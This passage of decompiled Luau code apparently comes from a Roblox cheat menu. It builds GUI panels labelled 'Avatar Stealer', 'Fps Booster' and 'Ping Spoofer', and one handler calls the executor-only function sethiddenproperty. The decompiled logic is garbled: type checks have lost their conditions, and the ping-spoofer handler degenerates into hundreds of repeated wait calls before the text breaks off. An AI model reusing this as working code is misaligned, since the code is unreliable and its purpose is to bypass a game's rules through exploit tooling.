Boosters_Spoofers_Clumsy.Position = UDim2_New(0, 8, 0, 2);
Boosters_Spoofers_Clumsy.BackgroundTransparency = 1;
Boosters_Spoofers_Clumsy.Text = "Boosters / Spoofers / Clumsy";
Boosters_Spoofers_Clumsy.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Boosters_Spoofers_Clumsy.Font = Enum.Font.GothamBold;
Boosters_Spoofers_Clumsy.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Boosters_Spoofers_Clumsy.TextXAlignment = Enum.TextXAlignment.Left;
Boosters_Spoofers_Clumsy.Parent = Frame_62;
local Frame_63 = Instance.new"Frame";
Frame_63.Size = UDim2_New(1, 0, 1, -28);
Frame_63.Position = UDim2_New(0, 0, 0, 28);
Frame_63.BackgroundTransparency = 1;
Frame_63.Parent = Frame_62;
local UIListLayout_26 = Instance.new"UIListLayout";
UIListLayout_26.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_26.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_26.Parent = Frame_63;
local UIPadding_20 = Instance.new"UIPadding";
UIPadding_20.PaddingLeft = UDim_New(0, 8);
UIPadding_20.PaddingRight = UDim_New(0, 8);
UIPadding_20.PaddingBottom = UDim_New(0, 8);
UIPadding_20.Parent = Frame_63;
UIListLayout_26:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_96, b_96, c_96)
    Frame_62.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_26.AbsoluteContentSize.Y + 36
    );
end);
local Frame_64 = Instance.new"Frame";
Frame_64.Size = UDim2_New(1, 0, 0, 30);
Frame_64.BackgroundColor3 = R294_Result_3;
Frame_64.BorderSizePixel = 0;
ScrollingFrame_14:GetChildren();
Frame_64.LayoutOrder = 0;
Frame_64.Parent = ScrollingFrame_14;
r2616 = Instance.new("UICorner", Frame_64);
r2616.CornerRadius = UDim_New(0, 6);
local UIStroke_44 = Instance.new"UIStroke";
UIStroke_44.Color = R294_Result_4;
UIStroke_44.Parent = Frame_64;
local Avatar_Stealer = Instance.new"TextLabel";
Avatar_Stealer.Size = UDim2_New(1, -16, 0, 26);
Avatar_Stealer.Position = UDim2_New(0, 8, 0, 2);
Avatar_Stealer.BackgroundTransparency = 1;
Avatar_Stealer.Text = "Avatar Stealer";
Avatar_Stealer.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Avatar_Stealer.Font = Enum.Font.GothamBold;
Avatar_Stealer.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Avatar_Stealer.TextXAlignment = Enum.TextXAlignment.Left;
Avatar_Stealer.Parent = Frame_64;
local Frame_65 = Instance.new"Frame";
Frame_65.Size = UDim2_New(1, 0, 1, -28);
Frame_65.Position = UDim2_New(0, 0, 0, 28);
Frame_65.BackgroundTransparency = 1;
Frame_65.Parent = Frame_64;
local UIListLayout_27 = Instance.new"UIListLayout";
UIListLayout_27.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_27.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_27.Parent = Frame_65;
local UIPadding_21 = Instance.new"UIPadding";
UIPadding_21.PaddingLeft = UDim_New(0, 8);
UIPadding_21.PaddingRight = UDim_New(0, 8);
UIPadding_21.PaddingBottom = UDim_New(0, 8);
UIPadding_21.Parent = Frame_65;
UIListLayout_27:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_97, b_97, c_97)
    Frame_64.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_27.AbsoluteContentSize.Y + 36
    );
end);
game:GetService("Lighting");
local Terrain = workspace:FindFirstChildOfClass("Terrain");
local TextButton_27 = Instance.new"TextButton";
TextButton_27.Size = UDim2_New(1, 0, 0, 26);
TextButton_27.BackgroundTransparency = 1;
TextButton_27.Text = "";
TextButton_27.AutoButtonColor = false;
TextButton_27.LayoutOrder = 1;
TextButton_27.Parent = Frame_63;
local Frame_66 = Instance.new"Frame";
Frame_66.Size = UDim2_New(0, 16, 0, 16);
Frame_66.Position = UDim2_New(0, 0, 0.5, -8);
Frame_66.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_66.Parent = TextButton_27;
r2672 = Instance.new("UICorner", Frame_66);
r2672.CornerRadius = UDim_New(0, 4);
local ImageLabel_15 = Instance.new"ImageLabel";
ImageLabel_15.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_15.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_15.BackgroundTransparency = 1;
ImageLabel_15.Image = "rbxassetid://83827110621355";
ImageLabel_15.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_15.ImageTransparency = 1;
ImageLabel_15.Parent = Frame_66;
local Fps_Regex = Instance.new"TextLabel";
Fps_Regex.Size = UDim2_New(1, -26, 1, 0);
Fps_Regex.Position = UDim2_New(0, 20, 0, 0);
Fps_Regex.BackgroundTransparency = 1;
Fps_Regex.Text = "Fps Booster [ 1 ]";
Fps_Regex.TextColor3 = R294_Result_6;
Fps_Regex.Font = Enum.Font.GothamBold;
Fps_Regex.TextSize = 13;
Fps_Regex.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Fps_Regex.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Fps_Regex.TextYAlignment = Enum.TextYAlignment.Center;
Fps_Regex.Parent = TextButton_27;
TextButton_27.MouseButton1Click:Connect(function(a_98, b_98, c_98)
    TweenService:Create(Frame_66, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_15, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_99, a_99, b_99, c_99)
        for for_key_11, for_val_11 in ipairs(Lighting:GetChildren()) do
            for_val_11:IsA("PostEffect");
            table.insert({}, for_val_11);
            for_val_11.Parent = nil;
        end;
        for for_key_12, for_val_12 in ipairs(workspace:GetDescendants()) do
            for_val_12:IsA("BasePart");
            local _ = Enum.Material.SmoothPlastic;
            for_val_12.Material = Enum.Material.SmoothPlastic;
            for_val_12.CastShadow = false;
            for_val_12.Reflectance = 0;
        end;
    end);
end);
game:GetService("RunService");
game:GetService("Lighting");
game:GetService("Workspace");
local TextButton_28 = Instance.new"TextButton";
TextButton_28.Size = UDim2_New(1, 0, 0, 26);
TextButton_28.BackgroundTransparency = 1;
TextButton_28.Text = "";
TextButton_28.AutoButtonColor = false;
TextButton_28.LayoutOrder = 2;
TextButton_28.Parent = Frame_63;
local Frame_67 = Instance.new"Frame";
Frame_67.Size = UDim2_New(0, 16, 0, 16);
Frame_67.Position = UDim2_New(0, 0, 0.5, -8);
Frame_67.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_67.Parent = TextButton_28;
r2711 = Instance.new("UICorner", Frame_67);
r2711.CornerRadius = UDim_New(0, 4);
local ImageLabel_16 = Instance.new"ImageLabel";
ImageLabel_16.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_16.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_16.BackgroundTransparency = 1;
ImageLabel_16.Image = "rbxassetid://83827110621355";
ImageLabel_16.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_16.ImageTransparency = 1;
ImageLabel_16.Parent = Frame_67;
local Fps_Regex_2 = Instance.new"TextLabel";
Fps_Regex_2.Size = UDim2_New(1, -26, 1, 0);
Fps_Regex_2.Position = UDim2_New(0, 20, 0, 0);
Fps_Regex_2.BackgroundTransparency = 1;
Fps_Regex_2.Text = "Fps Booster [ 2 ]";
Fps_Regex_2.TextColor3 = R294_Result_6;
Fps_Regex_2.Font = Enum.Font.GothamBold;
Fps_Regex_2.TextSize = 13;
Fps_Regex_2.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Fps_Regex_2.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Fps_Regex_2.TextYAlignment = Enum.TextYAlignment.Center;
Fps_Regex_2.Parent = TextButton_28;
TextButton_28.MouseButton1Click:Connect(function(a_100, b_100, c_100)
    TweenService:Create(Frame_67, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_16, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_101, a_101, b_101, c_101)
        local _ = Enum.Technology.Compatibility;
        fenv.sethiddenproperty(Lighting, "Technology", Enum.Technology.Compatibility);
        for for_key_13, for_val_13 in ipairs(workspace:GetDescendants()) do
            for_val_13:IsA("SpecialMesh");
            for_val_13:IsA("MeshPart");
            for_val_13:IsA("SpecialMesh");
            for_val_13.TextureId = "";
        end;
        local _ = Enum.ClientAnimatorThrottlingMode.Enabled;
        workspace.ClientAnimatorThrottling = Enum.ClientAnimatorThrottlingMode.Enabled;
    end);
end);
local Frame_68 = Instance.new"Frame";
Frame_68.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_68.BorderSizePixel = 0;
Frame_68.BackgroundTransparency = 1;
Frame_68.LayoutOrder = 3;
Frame_68.Parent = Frame_63;
r2736 = Instance.new("UICorner", Frame_68);
r2736.CornerRadius = UDim_New(0, 8);
local UIPadding_22 = Instance.new"UIPadding";
UIPadding_22.PaddingTop = UDim_New(0, 10);
UIPadding_22.PaddingBottom = UDim_New(0, 10);
UIPadding_22.PaddingLeft = UDim_New(0, 10);
UIPadding_22.PaddingRight = UDim_New(0, 10);
UIPadding_22.Parent = Frame_68;
local Spoofers = Instance.new"TextLabel";
Spoofers.Size = UDim2_New(1, 0, 1, 0);
Spoofers.BackgroundTransparency = 1;
Spoofers.Text = "Spoofers";
Spoofers.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
Spoofers.Font = Enum.Font.Gotham;
Spoofers.TextSize = 13;
Spoofers.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Spoofers.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Spoofers.TextYAlignment = Enum.TextYAlignment.Center;
Spoofers.Parent = Frame_68;
Frame_68.Size = UDim2_New(1, 0, 0, 21);
local TextButton_29 = Instance.new"TextButton";
TextButton_29.Size = UDim2_New(1, 0, 0, 26);
TextButton_29.BackgroundTransparency = 1;
TextButton_29.Text = "";
TextButton_29.AutoButtonColor = false;
TextButton_29.LayoutOrder = 4;
TextButton_29.Parent = Frame_63;
local Frame_69 = Instance.new"Frame";
Frame_69.Size = UDim2_New(0, 16, 0, 16);
Frame_69.Position = UDim2_New(0, 0, 0.5, -8);
Frame_69.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_69.Parent = TextButton_29;
r2769 = Instance.new("UICorner", Frame_69);
r2769.CornerRadius = UDim_New(0, 4);
local ImageLabel_17 = Instance.new"ImageLabel";
ImageLabel_17.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_17.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_17.BackgroundTransparency = 1;
ImageLabel_17.Image = "rbxassetid://83827110621355";
ImageLabel_17.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_17.ImageTransparency = 1;
ImageLabel_17.Parent = Frame_69;
local Ping_Spoofer = Instance.new"TextLabel";
Ping_Spoofer.Size = UDim2_New(1, -26, 1, 0);
Ping_Spoofer.Position = UDim2_New(0, 20, 0, 0);
Ping_Spoofer.BackgroundTransparency = 1;
Ping_Spoofer.Text = "Ping Spoofer";
Ping_Spoofer.TextColor3 = R294_Result_6;
Ping_Spoofer.Font = Enum.Font.GothamBold;
Ping_Spoofer.TextSize = 13;
Ping_Spoofer.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Ping_Spoofer.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Ping_Spoofer.TextYAlignment = Enum.TextYAlignment.Center;
Ping_Spoofer.Parent = TextButton_29;
TextButton_29.MouseButton1Click:Connect(function(a_102, b_102, c_102)
    TweenService:Create(Frame_69, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_17, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_103, a_103, b_103, c_103)
        task.spawn(function()
            math.random(20, 45);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
